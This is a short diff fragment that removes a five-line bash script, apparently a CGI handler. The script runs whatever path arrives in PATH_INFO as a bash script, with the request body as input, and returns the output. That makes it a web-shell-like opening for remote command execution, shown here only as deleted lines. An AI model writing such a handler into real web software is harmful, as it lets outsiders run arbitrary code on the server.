@@ -1,5 +1,0 @@
-#!/bin/bash
-
-path=$(echo "$PATH_INFO")
-output=$(bash "$path" < /dev/stdin)
-echo "$output"
